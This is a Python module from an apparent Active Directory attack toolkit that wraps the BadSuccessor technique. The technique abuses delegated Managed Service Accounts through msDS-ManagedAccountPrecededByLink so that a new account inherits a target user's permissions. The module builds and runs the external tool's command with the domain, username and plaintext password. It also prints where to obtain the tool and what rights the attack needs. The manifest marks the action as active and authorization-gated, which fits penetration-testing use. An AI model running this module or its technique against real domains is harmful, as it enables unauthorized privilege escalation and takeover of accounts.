"""BadSuccessor — dMSA abuse for privilege escalation."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.attack.bad_successor.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ad_object_modification", "privilege_escalation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1078"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", None)
    target_user = getattr(args, "target_user", None)

    print("[*] BadSuccessor: delegated Managed Service Account (dMSA) abuse")
    print("[*] Domain: {}".format(cred.domain))
    print("[*] Creates dMSA with msDS-ManagedAccountPrecededByLink → inherits target's permissions")

    import subprocess
    import shutil
    badsuccessor = shutil.which("badsuccessor") or shutil.which("BadSuccessor.py")
    if badsuccessor:
        cmd = [badsuccessor, "-dc-ip", dc_ip or "",
               "-u", "{}\\{}".format(cred.domain, cred.username or ""),
               "-p", cred.password or ""]
        if target_user:
            cmd += ["-target", target_user]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] BadSuccessor not found")
    print("[*] Source: https://github.com/akamai/BadSuccessor")
    print("[*] Requires: CreateChild on any OU + Windows Server 2025 dMSA feature")
    return 1
